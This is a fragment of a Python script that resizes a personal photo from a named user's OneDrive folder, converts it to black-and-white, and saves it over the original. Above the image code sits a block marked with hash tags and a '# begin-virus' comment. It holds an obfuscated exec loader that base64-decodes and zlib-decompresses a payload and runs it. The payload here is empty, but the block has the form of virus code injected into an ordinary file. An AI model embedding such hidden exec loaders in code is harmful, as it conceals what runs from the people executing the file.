...
# begin-c6d2c9cb3ec78d6b0b93718e8b068e17
exec("import zlib\nimport base64\nexec(zlib.decompress(base64.urlsafe_b64decode(b'eNoDAAAAAAE=')))")
# end-c6d2c9cb3ec78d6b0b93718e8b068e17
# begin-virus
...
file = r"C:\Users\WinstonBai\OneDrive\Pictures\Camera Roll\The_True_Chosen_One.jpg"
img = Image.open(file)
size=(300,169)
img = img.resize(size)
...
img=img.convert("1")
img.show()
img.save(r"C:\Users\WinstonBai\OneDrive\Pictures\Camera Roll\The_True_Chosen_One.jpg")